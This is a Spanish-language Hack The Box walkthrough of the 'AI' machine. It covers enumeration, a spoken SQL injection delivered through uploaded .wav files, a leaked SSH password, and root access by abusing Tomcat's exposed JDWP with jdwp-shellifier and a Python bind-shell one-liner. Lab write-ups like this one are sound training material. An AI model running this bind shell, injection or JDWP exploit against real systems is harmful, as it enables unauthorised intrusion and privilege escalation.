+++
images = ["/images/htb/ai/ai-header.jpg"]
date = "2020-02-07T00:00:00Z"
tags = ["htb-medium", "linux", "sqli", "jwdp"]
title = "Hack The Box - AI"
description = "Mi paso a paso de AI de Hack The Box."
toc = true
+++
{{< image src="/images/htb/ai/info-card.png" position="center" style="border-radius: 8px;" >}}

## Resumen rápido

Finalmente estoy posteando el walk-through de esta máquina, actualmente estoy preparando el OSCP, por lo que no tengo tanto tiempo para poder escribir en el momento.
Al momento que rompí esta máquina, aún estaba documentando solamente vía screenshots, por lo que la fecha/hora entre algunas cosas puede diferir (le entré de nuevo para conseguir doc. más clara).

Esta fue una máquina que para el punto de entrada, es necesario subir un .wav con una inyección sql a modo de conseguir un reverso shell (el .wav es interpretado por la "AI"), y para el root el exploit [JWDP](https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html), la idea de usar una AI a modo de conseguir el punto de entrada, es original, pero siento que no sél a la implementación le faltó algo, fueronnecesarios muchos intento-error para poder dar con la SQLi necesaria, y además con los diferentes [TTS](https://en.wikipedia.org/wiki/Speech_synthesis), que se yo no es una máquina que sienta que realmente me haya enseñado algo nuevo del todo.

Bue...hora de empezar a romper un poco!

## Nmap

Como siempre, arrancar enumerando ejecutando Nmap:

```console
# Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
Nmap scan report for ai.htb (10.10.10.163)
Host is up (0.019s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello AI!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/11%OT=22%CT=1%CU=38328%PV=Y%DS=2%DC=I%G=Y%TM=5DF152
OS:AE%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=108%GCD=2%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%
OS:O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 11 15:33:50 2019 -- 1 IP address (1 host up) scanned in 20.74 seconds
```

Nmap encuetra abiertos SSH y HTTP (Apache 2.4.29 es el server) abiertos.

## Enumeración Web

La página inicial, muestra una web con menús interactivos, uno de ellos da a un "anuncio" de una AI creada por la empresa (la que simula ser la web) que puede identificar audio, y para probarla se da la posibilidad de subir un .wav al server, o sea ahí ya hay una forma de subir un reverso shell.
Algo más de enumeración se lleva a cabo.

{{< image src="/images/htb/ai/1.1-web.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/ai/1.1-web-php-1.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/ai/1.1-web-php-2.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/ai/1.1-web-php-3.png" position="center" style="border-radius: 8px;" >}}

Se trata de crear un .wav desde un archivo de texto (.txt -> .mp3 -> .wav), subirlo y ver que pasa, el resultado es una excepción que da un hint: hay un base de datos del otro lado, por lo que puede ser probable (más con la excepción que se pueda hacer una inyección).

{{< image src="/images/htb/ai/1.1-web-rce-1.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/ai/1.1-web-rce-2.png" position="center" style="border-radius: 8px;" >}}

## Punto de entrada

Los pasos para tratar de armar una inyección sql, fueron los mismos que antes para un RCE, basados en lo que gobuster tiró de resultado contra AI, se puede ver que hay algunos .php, uno de ellos en particular suena interesante; ```intelligence.php```.

```console
root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.163
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/02/07 15:23:07 Starting gobuster
===============================================================
/images (Status: 301)
/index.php (Status: 200)
/contact.php (Status: 200)
/about.php (Status: 200)
/uploads (Status: 301)
/db.php (Status: 200)
/intelligence.php (Status: 200)
/ai.php (Status: 200)
===============================================================
2020/02/07 15:48:32 Finished
===============================================================
```

Al mirar el contenido de ```intelligence.php```, es fácil notar que es la API de la AI, y esto es útil, ya que nos da base para saber como deberíamos de interactuar con la AI para armar la inyección que se precisa.

{{< image src="/images/htb/ai/2.1-rce-2.png" position="center" style="border-radius: 8px;" >}}

Después de un montón de prueba-error (que no está de más decir, si no fuese por la ayuda/guía de [Interep](https://www.hackthebox.eu/profile/10423) tanto con TTS o la query, no sé si iba a ir mucho más lejos :P), como no soy un habnlante nativo de inglés (ni tampoco tener micrófono), fue por eso la decisión de usar un TTS, con el que me terminé quedando fue con [Text 2 Speech](https://www.text2speech.org/):

{{< image src="/images/htb/ai/t2s.png" position="center" style="border-radius: 8px;" >}}

Las queries conseguidas al final, son así:

```
User:
Open single quote union select, username from users Comment Database
Password:
Open single quote union select, password from users Comment Database
```

Y una vez que se suben los respectivos.wav generados por el TTS que comenté arriba, se consiguen los siguientes resultados:

{{< image src="/images/htb/ai/command-ok-1.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/ai/command-ok-2.png" position="center" style="border-radius: 8px;" >}}


Se intenta loguearse a ssh con esas credenciales:

```
user: alexa
passwd: H,Sq9t6}a<)?q93_
```

Exito!!

```console
root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
alexa@10.10.10.163's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb  7 20:27:47 UTC 2020

  System load:  0.14               Processes:           162
  Usage of /:   28.0% of 19.56GB   Users logged in:     1
  Memory usage: 27%                IP address for eth0: 10.10.10.163
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

63 packages can be updated.
15 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Feb  7 20:14:41 2020 from 10.10.14.29
alexa@AI:~$ wc -c user.txt
33 user.txt
```

## Escalamiento de privilegios

Cuando se revisan que procesos/puertos ahí abiertos, se ve que está el 8080 abierto:
```console
alexa@AI:~$ ss -punta
Netid               State                    Recv-Q                Send-Q                                       Local Address:Port                                        Peer Address
:Port                 
udp                 UNCONN                   0                     0                                            127.0.0.53%lo:53                                               0.0.0.0
:*                    
udp                 UNCONN                   0                     0                                                  0.0.0.0:5353                                             0.0.0.0
:*                    
udp                 UNCONN                   0                     0                                                  0.0.0.0:53210                                            0.0.0.0
:*                    
udp                 UNCONN                   0                     0                                                     [::]:5353                                                [::]
:*                    
udp                 UNCONN                   0                     0                                                     [::]:55175                                               [::]
:*                    
tcp                 LISTEN                   0                     1                                                127.0.0.1:8000                                             0.0.0.0:*                    
tcp                 LISTEN                   0                     80                                               127.0.0.1:3306                                             0.0.0.0:*                    
tcp                 LISTEN                   0                     128                                          127.0.0.53%lo:53                                               0.0.0.0:*                    
tcp                 LISTEN                   0                     128                                                0.0.0.0:22                                               0.0.0.0:*                    
tcp                 ESTAB                    0                     0                                             10.10.10.163:22                                           10.10.14.29:58570                
tcp                 ESTAB                    0                     36                                            10.10.10.163:22                                           10.10.14.29:54700                
tcp                 LISTEN                   0                     1                                       [::ffff:127.0.0.1]:8005                                                   *:*                    
tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8009                                                   *:*                    
tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8080                                                   *:*                    
tcp                 LISTEN                   0                     128                                                      *:80                                                     *:*                    
tcp                 LISTEN                   0                     128                                                   [::]:22                                                  [::]:*                    
tcp                 TIME-WAIT                0                     0                                       [::ffff:127.0.0.1]:8080                                  [::ffff:127.0.0.1]:3883
```

Si se abre un tunnel ssh con ```ssh -L 8080:localhost:8080 alexa@10.10.10.163``` para cambiar la configuración del browser y ver que servicio está corriendo ahí, se encuentra que es un tomcat:

{{< image src="/images/htb/ai/tomcat-tunnel.png" position="center" style="border-radius: 8px;" >}}

Y, sorpresa! Está corriendo como root y encima con [JDWP](https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html) habilitado..

```console
root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
```

Con una búsqueda rápida en google, se encuentra este [exploit](https://www.exploit-db.com/exploits/46501)

Entonces, para usar ese exploit se crea un ```bind.sh``` en ```/tmp``` con el siguiente código:

```python
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
```

Osea, se va a levantar un bind shell escuchando en el puerto 2222, se ejecuta el script:

```console
alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
[+] Targeting '127.0.0.1:8000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
[+] Found Runtime class: id=650
[+] Found Runtime.getRuntime(): id=7f9080006b60
[+] Created break event id=2
[+] Waiting for an event on 'java.lang.String.indexOf'
[+] Received matching event from thread 0x6ed
[+] Selected payload '/tmp/bind.sh'
[+] Command string object created id:6ee
[+] Runtime.getRuntime() returned context id:0x6ef
[+] found Runtime.exec(): id=7f9080006b98
[+] Runtime.exec() successful, retId=6f0
[!] Command successfully executed
```

Después de eso, si se trata iniciar una conexión contra el servidor con nc a la IP:puerto contra la que se corrió el exploit, se consigue un reverso con root:

```console
root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
ai.lnx.htb [10.10.10.163] 2222 (?) open
bash: cannot set terminal process group (6086): Inappropriate ioctl for device
bash: no job control in this shell
root@AI:~# wc -c /root/root.txt
wc -c /root/root.txt
33 /root/root.txt
```

Y, ahí 'ta, acceso a root y la bandera root.txt :D.

Hasta el momento, esta fue una de las únicas máquinas en HTB que no me ha gustado tanto, gracias más que nada a que el punto de entrada es medio esotérico y realmente no te deja mucha enseñanza al respecto.
Bue, próximamente estoy pensando en empezar a blogear lo que es este viaje de estar preparando el OSCP, para saber, quedar al tanto, 'ta luego!
